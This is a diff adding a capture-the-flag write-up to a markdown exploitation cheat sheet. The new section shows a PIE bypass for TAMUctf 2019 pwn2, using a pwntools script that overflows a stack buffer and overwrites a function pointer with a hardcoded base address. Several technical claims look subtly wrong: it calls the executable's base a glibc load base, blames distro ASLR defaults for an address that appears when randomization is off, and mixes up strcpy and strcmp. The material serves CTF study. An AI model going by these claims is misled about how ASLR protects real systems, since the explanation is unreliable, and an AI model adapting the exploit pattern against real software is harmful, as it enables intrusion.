@@ -17,6 +17,7 @@
 - [9-Byte test+je Timing Leak (hxp 2018)](#9-byte-testje-timing-leak-hxp-2018)
 - [RtlCaptureContext Deterministic Windows Stack Leak (Insomnihack 2017)](#rtlcapturecontext-deterministic-windows-stack-leak-insomnihack-2017)
 - [IEEE 754 Double-as-Shellcode via Exponent Fixing (Kaspersky 2018)](#ieee-754-double-as-shellcode-via-exponent-fixing-kaspersky-2018)
+- [PIE Bypass via Consistent glibc Load Base 0x56555000 (TAMUctf 2019)](#pie-bypass-via-consistent-glibc-load-base-0x56555000-tamuctf-2019)
 
 **See also:** [heap-techniques.md](heap-techniques.md) — House of Apple 2, House of Einherjar, House of Orange/Spirit/Lore/Force, heap grooming, custom allocator exploitation (nginx, talloc), classic unlink, musl libc heap, tcache stashing unlink
 
@@ -295,3 +296,31 @@ d6 = 6*target_int - (d1_int + d2_int + d3_int + d4_int + d5_int)
 **Key insight:** IEEE 754 doubles are lossless integer containers whenever the exponent field is fixed at `bias + 52`. Any "you can only write N doubles" primitive is equivalent to "you can write N×6 bytes of raw data", as long as you control the exponent bits. Works identically for 32-bit floats (`bias + 23`) and long doubles.
 
 **References:** Kaspersky Industrial CTF 2018 — doubles, writeups 12324, 12326
+
+---
+
+## PIE Bypass via Consistent glibc Load Base 0x56555000 (TAMUctf 2019)
+
+**Pattern (pwn2):** PIE-enabled 32-bit ELF with no leak primitive. A function pointer on the stack is called after `strcpy`ing user input into a 30-byte buffer; overwriting the pointer lets us pick any code target — but the randomised base normally blocks picking `print_flag`. Observation: on the challenge runtime (and many default glibc configurations for i386 PIE binaries), the loader places the executable at the fixed base `0x56555000` across runs. That makes PIE effectively a known-offset: `print_flag = 0x56555000 + 0x6dc`, reachable without any leak.
+
+```python
+# `gdb -q ./pwn2` -> `info proc mappings`
+# 0x56555000 0x56556000 0x1000    0x0 ./pwn2
+# 0x56556000 0x56557000 0x1000    0x0 ./pwn2
+# print_flag symbol offset: 0x6dc
+
+from pwn import *
+
+PIE_BASE = 0x56555000
+print_flag = PIE_BASE + 0x6dc
+
+payload  = cyclic(30)           # buffer(30) -> reaches the fn pointer slot
+payload += p32(print_flag)      # overwrite var_C called after strcmp
+io = remote('pwn.tamuctf.com', 4322)
+io.sendline(payload)
+io.interactive()
+```
+
+**Key insight:** 32-bit PIE on many distros emits `ET_DYN` with a stock `mmap_base` of `0x56555000` because `brk_randomization` and ASLR entropy are minimal. If `info proc mappings` shows the same base across multiple runs (in the challenge container or in gdb with `set disable-randomization on`), treat the "random" base as a constant. Always enumerate map bases before assuming a leak is required — the same trick applies to stacks started under `ulimit -s unlimited` (base becomes `0x7fff_f000` deterministically).
+
+**References:** TAMUctf 2019 — pwn2, writeup 13423
